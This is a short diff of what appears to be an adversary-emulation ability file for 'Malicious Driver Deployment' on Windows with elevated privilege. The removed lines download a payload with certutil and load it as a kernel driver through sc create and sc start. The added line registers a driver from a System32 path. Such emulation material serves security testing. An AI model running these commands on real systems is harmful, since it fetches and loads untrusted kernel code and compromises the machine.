@@ -1,6 +1,6 @@
 - id: 8e673a36-4f16-4f4c-acf7-ca95bc586384
-  name: 6d6dfb7a684f7374656aea13ad764e90 - Malicious Driver Deployment
-  description: 'Malicious driver: 6d6dfb7a684f7374656aea13ad764e90
+  name: 8e673a36-4f16-4f4c-acf7-ca95bc586384 - Malicious Driver Deployment
+  description: 'Malicious driver: 8e673a36-4f16-4f4c-acf7-ca95bc586384
 
     Category: vulnerable driver
 
@@ -16,12 +16,8 @@
   platforms:
     windows:
       cmd:
-        command: 'certutil.exe -urlcache -split -f #{{6d6dfb7a684f7374656aea13ad764e90.bin}}
-          %TEMP%\6d6dfb7a684f7374656aea13ad764e90.bin && sc create MaliciousDriver
-          binPath= "%TEMP%\6d6dfb7a684f7374656aea13ad764e90.bin" type= kernel && sc
-          start MaliciousDriver'
-        payloads:
-        - 6d6dfb7a684f7374656aea13ad764e90.bin
+        command: sc create MaliciousDriver binPath= "C:\Windows\System32\drivers\malicious_driver.sys"
+          type= kernel
   singleton: true
   privilege: Elevated
   repeatable: false
